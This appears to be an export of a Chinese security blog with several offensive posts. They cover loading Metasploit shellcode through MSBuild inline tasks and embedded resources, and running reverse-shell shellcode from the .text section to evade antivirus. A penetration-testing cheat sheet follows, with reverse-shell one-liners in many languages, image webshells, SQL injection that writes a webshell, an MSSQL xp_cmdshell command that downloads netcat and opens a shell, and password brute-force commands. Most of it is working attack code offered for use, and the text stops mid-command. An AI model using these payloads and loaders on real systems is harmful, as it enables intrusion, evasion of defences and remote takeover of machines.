0x33,0xc9,0x83,0xe9,0xaa,0xe8,0xff,0xff,0xff,0xff,0xc0,0x5e,0x81,0x76,0x0e,0x1c,0xb8,0xf2,0x6e,0x83,0xee,0xfc,0xe2,0xf4,0xe0,0x50,0x70,0x6e,0x1c,0xb8,0x92,0xe7,0xf9,0x89,0x32,0x0a,0x97,0xe8,0xc2,0xe5,0x4e,0xb4,0x79,0x3c,0x08,0x33,0x80,0x46,0x13,0x0f,0xb8,0x48,0x2d,0x47,0x5e,0x52,0x7d,0xc4,0xf0,0x42,0x3c,0x79,0x3d,0x63,0x1d,0x7f,0x10,0x9c,0x4e,0xef,0x79,0x3c,0x0c,0x33,0xb8,0x52,0x97,0xf4,0xe3,0x16,0xff,0xf0,0xf3,0xbf,0x4d,0x33,0xab,0x4e,0x1d,0x6b,0x79,0x27,0x04,0x5b,0xc8,0x27,0x97,0x8c,0x79,0x6f,0xca,0x89,0x0d,0xc2,0xdd,0x77,0xff,0x6f,0xdb,0x80,0x12,0x1b,0xea,0xbb,0x8f,0x96,0x27,0xc5,0xd6,0x1b,0xf8,0xe0,0x79,0x36,0x38,0xb9,0x21,0x08,0x97,0xb4,0xb9,0xe5,0x44,0xa4,0xf3,0xbd,0x97,0xbc,0x79,0x6f,0xcc,0x31,0xb6,0x4a,0x38,0xe3,0xa9,0x0f,0x45,0xe2,0xa3,0x91,0xfc,0xe7,0xad,0x34,0x97,0xaa,0x19,0xe3,0x41,0xd0,0xc1,0x5c,0x1c,0xb8,0x9a,0x19,0x6f,0x8a,0xad,0x3a,0x74,0xf4,0x85,0x48,0x1b,0x31,0x1a,0x91,0xcc,0x00,0x62,0x6f,0x1c,0xb8,0xdb,0xaa,0x48,0xe8,0x9a,0x47,0x9c,0xd3,0xf2,0x91,0xc9,0xd2,0xf8,0x06,0xdc,0x10,0xa4,0xeb,0x74,0xba,0xf2,0x67,0x01,0x31,0x14,0x3e,0x4c,0xe8,0xa2,0x2e,0x4c,0xf8,0xa2,0x06,0xf6,0xb7,0x2d,0x8e,0xe3,0x6d,0x65,0x04,0x0c,0xee,0xa5,0x06,0x85,0x1d,0x86,0x0f,0xe3,0x6d,0x77,0xae,0x68,0xb2,0x0d,0x20,0x14,0xcd,0x1e,0x86,0x7b,0xb8,0xf2,0x6e,0x76,0xb8,0x98,0x6a,0x4a,0xef,0x9a,0x6c,0xc5,0x70,0xad,0x91,0xc9,0x3b,0x0a,0x6e,0x62,0x8e,0x79,0x58,0x76,0xf8,0x9a,0x6e,0x0c,0xb8,0xf2,0x38,0x76,0xb8,0x9a,0x36,0xb8,0xeb,0x17,0x91,0xc9,0x2b,0xa1,0x04,0x1c,0xee,0xa1,0x39,0x74,0xba,0x2b,0xa6,0x43,0x47,0x27,0xed,0xe4,0xb8,0x8f,0x46,0x44,0xd0,0xf2,0x2e,0x1c,0xb8,0x98,0x6e,0x4c,0xd0,0xf9,0x41,0x13,0x88,0x0d,0xbb,0x4b,0xd0,0x87,0x00,0x51,0xd9,0x0d,0xbb,0x42,0xe6,0x0d,0x62,0x38,0xb7,0x77,0x1e,0xe3,0x47,0x0d,0x87,0x87,0x47,0x0d,0x91,0x1d,0x7b,0xdb,0xa8,0x69,0x79,0x31,0xd5,0xec,0x0d,0x50,0x38,0x76,0xb8,0xa1,0x91,0xc9,0xb8,0xf2,0x6e &#125;;                            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,            MEM_COMMIT, PAGE_EXECUTE_READWRITE);              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);              IntPtr hThread = IntPtr.Zero;              UInt32 threadId = 0;              IntPtr pinfo = IntPtr.Zero;              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);              WaitForSingleObject(hThread, 0xFFFFFFFF);              return true;          &#125;         &#125;               ]]&gt;          &lt;/Code&gt;        &lt;/Task&gt;      &lt;/UsingTask&gt;    &lt;/Project&gt;</code></pre><h3 id="0x02-执行载荷"><a href="#0x02-执行载荷" class="headerlink" title="0x02 执行载荷"></a>0x02 执行载荷</h3><p>首先利用MSF的<code>exploit/multi/handler</code>开启监听，然后我们在受控主机上执行：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319&gt;MSBuild D:/bad.xml</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133814195.png" alt="image-20201228133814195"></p><p>回连Shell如下：</p><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133910387.png" alt="image-20201228133910387"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 持久化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过资源文件加载Shellcode</title>
      <link href="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-生成Shellcode"><a href="#0x01-生成Shellcode" class="headerlink" title="0x01 生成Shellcode"></a>0x01 生成Shellcode</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=12345 &gt;payload.bin</code></pre><h3 id="0x02-添加资源文件"><a href="#0x02-添加资源文件" class="headerlink" title="0x02 添加资源文件"></a>0x02 添加资源文件</h3><p>右键<code>资源文件&gt;添加&gt;资源</code>添加我们刚刚生成的Shellcode</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140005634.png" alt="image-20201225140005634"></p><p>选择<code>导入</code>，添加<code>payload.bin</code></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140229778.png" alt="image-20201225140229778"></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140458518.png" alt="image-20201225140458518"></p><p>我们可以在资源文件中看到我们的bin文件已经被加载</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140603313.png" alt="image-20201225140603313"></p><p>代码：</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;int main()&#123;    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L&quot;PAYLOAD_BIN&quot;);    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, shellcodeResouceData, shellcodeSize);    ((void(*)())exec)();    return  0;&#125;</code></pre><h3 id="0x03-编译和验证"><a href="#0x03-编译和验证" class="headerlink" title="0x03 编译和验证"></a>0x03 编译和验证</h3><p>编译成功没有什么问题</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141139791.png" alt="image-20201225141139791"></p><p>生成的exe放到虚拟机里运行一下，成功</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141256996.png" alt="image-20201225141256996"></p><p>免杀率……将就吧，毕竟并没有做什么免杀的措施，只是一种加载shellcode的技巧而已</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141643919.png" alt="image-20201225141643919"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>避开Windows API执行Shellcode</title>
      <link href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/"/>
      <url>/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><pre><code class="c++">#pragma section(&quot;.text&quot;)// msvenom -p windows/x64/shell_reverse_tcp lhost=X lport=Y -f c__declspec(allocate(&quot;.text&quot;)) char goodcode[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&quot;&quot;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&quot;&quot;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54&quot;&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&quot;&quot;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&quot;&quot;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&quot;&quot;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&quot;&quot;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&quot;&quot;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63&quot;&quot;\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57&quot;&quot;\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44&quot;&quot;\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6&quot;&quot;\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff&quot;&quot;\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5&quot;&quot;\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff&quot;&quot;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&quot;;int main()&#123;    (*(void(*)())(&amp;goodcode))();&#125;</code></pre><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这种Shellcode的加载方式可以在编译时将Shellcode完全分配到<code>.text</code>段。此外将包含Shellcode的数组转换为函数指针并调用，从而避免了调用<code>CreateThread</code>之类的常用于跳转至Shellcode的Windows API。</p><p>这种方式可以有效避开一些杀毒软件的查杀。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 后渗透 </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试速查表</title>
      <link href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><h3 id="存活IP扫描"><a href="#存活IP扫描" class="headerlink" title="存活IP扫描"></a>存活IP扫描</h3><pre><code class="shell">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips</code></pre><h3 id="批量Ping"><a href="#批量Ping" class="headerlink" title="批量Ping"></a>批量Ping</h3><pre><code class="shell">#!/bin/bashfor lastOctet in &#123;1..254&#125;; do     ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;done</code></pre><h3 id="单个端口检查"><a href="#单个端口检查" class="headerlink" title="单个端口检查"></a>单个端口检查</h3><pre><code class="shell">nc -v $TARGET 80telnet $TARGET 80curl -vX $TARGET</code></pre><h3 id="少量端口探测"><a href="#少量端口探测" class="headerlink" title="少量端口探测"></a>少量端口探测</h3><pre><code class="shell">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done</code></pre><h3 id="nc端口扫描"><a href="#nc端口扫描" class="headerlink" title="nc端口扫描"></a>nc端口扫描</h3><pre><code class="shell">nc -nvv -w 1 -z host 1000-2000nc -nv -u -z -w 1 host 160-162</code></pre><h3 id="Masscan端口扫描"><a href="#Masscan端口扫描" class="headerlink" title="Masscan端口扫描"></a>Masscan端口扫描</h3><pre><code class="shell">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0</code></pre><h3 id="DNS信息查询-子域名爆破"><a href="#DNS信息查询-子域名爆破" class="headerlink" title="DNS信息查询&#x2F;子域名爆破"></a>DNS信息查询&#x2F;子域名爆破</h3><pre><code class="shell">whois domain.comdig &#123;a|txt|ns|mx&#125; domain.comdig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.comhost -t &#123;a|txt|ns|mx&#125; megacorpone.comhost -a megacorpone.comhost -l megacorpone.com ns1.megacorpone.comdnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.comdnsenum domain.comnslookup -&gt; set type=any -&gt; ls -d domain.comfor sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</code></pre><h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><pre><code class="shell">#列出NFS共享，如果存在&#39;rw,no_root_squash&#39;，可上传并执行sid-shellshowmount -e 192.168.110.102chown root:root sid-shell; chmod +s sid-shell</code></pre><h3 id="Kerberos枚举"><a href="#Kerberos枚举" class="headerlink" title="Kerberos枚举"></a>Kerberos枚举</h3><pre><code class="shell"># usersnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;</code></pre><h3 id="Web漏洞扫描（简易）"><a href="#Web漏洞扫描（简易）" class="headerlink" title="Web漏洞扫描（简易）"></a>Web漏洞扫描（简易）</h3><pre><code class="shell">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobustertarget=10.0.0.1; nikto -h http://$target:80 | tee $target-niktotarget=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum</code></pre><h3 id="RPC-NetBios-SMB探测"><a href="#RPC-NetBios-SMB探测" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMB探测"></a>RPC&#x2F;NetBios&#x2F;SMB探测</h3><pre><code class="shell">rpcinfo -p $TARGETnbtscan $TARGET#list sharessmbclient -L //$TARGET -U &quot;&quot;# null sessionrpcclient -U &quot;&quot; $TARGETsmbclient -L //$TARGETenum4linux $TARGET</code></pre><h3 id="SNMP探测"><a href="#SNMP探测" class="headerlink" title="SNMP探测"></a>SNMP探测</h3><pre><code class="shell"># Windows User Accountssnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25# Windows Running Programssnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2# Windows Hostnamesnmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27# Windows TCP Portssnmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3# Software Namesnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2# brute-force community stringsonesixtyone -i snmp-ips.txt -c community.txtsnmp-check $TARGET</code></pre><h3 id="SMTP探测"><a href="#SMTP探测" class="headerlink" title="SMTP探测"></a>SMTP探测</h3><pre><code class="shell">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150</code></pre><h3 id="域信息探测"><a href="#域信息探测" class="headerlink" title="域信息探测"></a>域信息探测</h3><pre><code class="shell"># current domain info[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()# domain trusts([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# current forest info[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()# get forest trust relationships([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()# get DCs of a domainnltest /dclist:offense.localnet group &quot;domain controllers&quot; /domain# get DC for currently authenticated sessionnltest /dsgetdc:offense.local# get domain trusts from cmd shellnltest /domain_trusts# get user infonltest /user:&quot;spotless&quot;# get DC for currently authenticated sessionset l# get domain name and DC the user authenticated toklist# get all logon sessions. Includes NTLM authenticated sessionsklist sessions# kerberos tickets for the sessionklist# cached krbtgtklist tgt# whoami on older Windows systemsset u# find DFS shares with ADModuleGet-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name# find DFS shares with ADSI$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % &#123;$_.properties.name&#125;# check if spooler service is running on a hostpowershell ls &quot;\\dc01\pipe\spoolss&quot;</code></pre><h3 id="Powershell下的端口监听"><a href="#Powershell下的端口监听" class="headerlink" title="Powershell下的端口监听"></a>Powershell下的端口监听</h3><pre><code class="powershell"># Start listener on port 443$listener = [System.Net.Sockets.TcpListener]443; $listener.Start(); while($true)&#123;    $client = $listener.AcceptTcpClient();    Write-Host $client.client.RemoteEndPoint &quot;connected!&quot;;    $client.Close();    start-sleep -seconds 1;&#125;</code></pre><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><pre><code class="shell">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;#URL-Encoded Perl: Linuxecho%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code class="shell">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre><code class="shell">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><pre><code class="shell">#1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f#2nc localhost 443 | /bin/sh | nc localhost 444</code></pre><h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><pre><code class="shell">telnet localhost 443 | /bin/sh | telnet localhost 444</code></pre><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre><code class="shell">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();</code></pre><h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><pre><code class="shell">xterm -display 10.0.0.1:1</code></pre><h3 id="非交互式shell升级"><a href="#非交互式shell升级" class="headerlink" title="非交互式shell升级"></a>非交互式shell升级</h3><pre><code class="shell">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;/bin/busybox sh</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><pre><code class="shell">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><h3 id="msf生成有效载荷"><a href="#msf生成有效载荷" class="headerlink" title="msf生成有效载荷"></a>msf生成有效载荷</h3><pre><code class="shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai</code></pre><h3 id="Linux下编译c代码"><a href="#Linux下编译c代码" class="headerlink" title="Linux下编译c代码"></a>Linux下编译c代码</h3><pre><code class="shell"># Windowsi686-w64-mingw32-gcc source.c -lws2_32 -o out.exe# Linuxgcc -m32|-m64 -o output source.c</code></pre><h3 id="Windows下编译为-obj"><a href="#Windows下编译为-obj" class="headerlink" title="Windows下编译为.obj"></a>Windows下编译为.obj</h3><pre><code class="shell"># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=Dnasm -f win64 .\hello.asm -o .\hello.obj# http://www.godevtool.com/Golink.zipGoLink.exe -o .\hello.exe .\hello.obj</code></pre><h3 id="py文件转换exe"><a href="#py文件转换exe" class="headerlink" title="py文件转换exe"></a>py文件转换exe</h3><pre><code class="shell">python pyinstaller.py --onefile convert-to-exe.py</code></pre><h3 id="生成有效载荷模式并计算偏移量"><a href="#生成有效载荷模式并计算偏移量" class="headerlink" title="生成有效载荷模式并计算偏移量"></a>生成有效载荷模式并计算偏移量</h3><pre><code class="shell">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE</code></pre><h2 id="WEB文件上传"><a href="#WEB文件上传" class="headerlink" title="WEB文件上传"></a>WEB文件上传</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>file.php -&gt; file.jpgfile.php -&gt; file.php.jpgfile.asp -&gt; file.asp;.jpgfile.gif (contains php code, but starts with string GIF/GIF98)00%file.jpg with php backdoor in exif (see below).jpg -&gt; proxy intercept -&gt; rename to .php</code></pre><h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>图片文件后门语句注入</p><pre><code class="shell">exiv2 -c&#39;A &quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;!&#39; backdoor.jpegexiftool “-comment&lt;=back.php” back.png</code></pre><h3 id="htaccess文件配置"><a href="#htaccess文件配置" class="headerlink" title=".htaccess文件配置"></a>.htaccess文件配置</h3><pre><code class="shell">#上传.htaccess文件将.blah文件解析为.php文件AddType application/x-httpd-php .blah</code></pre><h3 id="SQL注入上传WebShell"><a href="#SQL注入上传WebShell" class="headerlink" title="SQL注入上传WebShell"></a>SQL注入上传WebShell</h3><p>手工：</p><pre><code># Assumed 3 columnshttp://target/index.php?vulnParam=0&#39; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj</code></pre><p>SQLMap</p><pre><code class="shell"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 10</code></pre><p>NetCat(适用于xp_cmdshell可用的SQL Server)</p><pre><code class="shell"># netcat reverse shell via mssql injection when xp_cmdshell is available1000&#39;;+exec+master.dbo.xp_cmdshell+&#39;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#39;;--</code></pre><h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><h3 id="hydra破解Web服务密码"><a href="#hydra破解Web服务密码" class="headerlink" title="hydra破解Web服务密码"></a>hydra破解Web服务密码</h3><pre><code class="shell">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list</code></pre><h3 id="hydra破解通用协议口令"><a href="#hydra破解通用协议口令" class="headerlink" title="hydra破解通用协议口令"></a>hydra破解通用协议口令</h3><pre><code class="shell">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1</code></pre><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><pre><code class="shell"># Bruteforce based on the pattern;hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  # Generate password candidates: wordlist + pattern;hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout# Generate NetNLTMv2 with internalMonologue and crack with hashcatInternalMonologue.exe 